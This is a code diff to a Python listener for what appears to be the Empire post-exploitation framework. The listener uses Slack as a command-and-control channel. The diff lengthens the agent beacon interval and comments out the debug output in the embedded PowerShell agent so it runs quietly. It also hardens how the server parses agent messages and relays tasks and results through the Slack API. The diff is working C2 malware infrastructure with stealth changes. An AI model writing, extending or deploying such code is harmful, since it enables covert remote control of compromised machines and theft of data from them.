@@ -86,7 +86,7 @@ class Listener:
             'DefaultDelay' : {
                 'Description'   :   'Agent delay/reach back interval (in seconds).',
                 'Required'      :   True,
-                'Value'         :   5
+                'Value'         :   10
             },
             'DefaultJitter' : {
                 'Description'   :   'Jitter in agent reachback interval (0.0-1.0).',
@@ -432,7 +432,7 @@ class Listener:
                 getTask = """
                     $script:GetTask = {
 
-                        write-host '[*] Getting tasks'
+                        #write-host '[*] Getting tasks'
 
                         try {
 
@@ -496,7 +496,7 @@ class Listener:
                                 # if no replies give the listener 5 seconds to post a reply else give up
                                 $replies = $slack_response2["messages"] | select -skip 1;
 
-                                write-host "$(@($replies).count) replies and timeout is $timeout"
+                                #write-host "$(@($replies).count) replies and timeout is $timeout"
                                 if(([int]@($replies).count) -eq 0) {
                                     $timeout++
                                 }else{
@@ -521,11 +521,11 @@ class Listener:
                                 $replies = $slack_response["messages"] | select -skip 1;
                                 $raw_base64 = (($replies | %{ $_["text"] }) -join '').Replace('-MESSAGE_END-','')
                                 
-                                write-host "[*] Base64 joined back together total length is $($raw_base64.length)";
+                                #write-host "[*] Base64 joined back together total length is $($raw_base64.length)";
                                 
                                 $result=Decode-Base64 $raw_base64;
                                 if($result) {
-                                    write-host "[*] cypher text decode from base64";
+                                   # write-host "[*] cypher text decode from base64";
                                 }
 
 
@@ -533,8 +533,8 @@ class Listener:
                             }else{
 
                                 # delete message
-                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('Content-Type','application/x-www-form-urlencoded');
-                                $delete_response=$"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/chat.delete","POST","token=$($APIToken)&channel=$($Channel)&ts=$($current_ts)")
+                                #$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('Content-Type','application/x-www-form-urlencoded');
+                                #$delete_response=$"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/chat.delete","POST","token=$($APIToken)&channel=$($Channel)&ts=$($current_ts)")
 
                             }
                             
@@ -553,7 +553,7 @@ class Listener:
                     $script:SendMessage = {
                         param($Packets)
 
-                        write-host '[*] Sending messages'
+                        #write-host '[*] Sending messages'
 
                         if($Packets) {
                             
@@ -685,14 +685,18 @@ class Listener:
                                     # incoming agent data from a task
                                     if raw_message == '--MESSAGE_START--':
                                         data = get_data(thread_ts)
-                                        agent_sent = True
                                     else:
-                                        agent_sent = None
                                         data = None
 
-                                    agent = message["username"]
-                                    if ':' in agent:
-                                        data = base64.b64decode(raw_message)
+                                    if "username" in message:
+                                        agent = message["username"]
+                                    else:
+                                        agent = 'unknown:unknown'
+                                        print helpers.color("[!] No agent name for message: {}".format(message))
+
+                                    if ':' in agent and raw_message:
+                                        if not data:
+                                            data = base64.b64decode(raw_message)
                                         agent, stage = agent.split(':')
 
                                         return agent, stage, data, thread_ts, agent_sent
@@ -922,10 +926,11 @@ class Listener:
                             task_data = self.mainMenu.agents.handle_agent_data(staging_key, data, listener_options, update_lastseen=False)
 
                             # Process any further tasks for the agent so it can continue
-                            for task in task_data:
-                                lang, data = task
-                                if data and agent_sent == None:
-                                    post_data(base64.encodestring(data),agent,channel_id,thread_ts,listener_name,user_api_token)
+                            if task_data:
+                                for task in task_data:
+                                    lang, data = task
+                                    if data and agent_sent == None:
+                                        post_data(base64.encodestring(data),agent,channel_id,thread_ts,listener_name,user_api_token)
 
                    
                 except Exception as e:
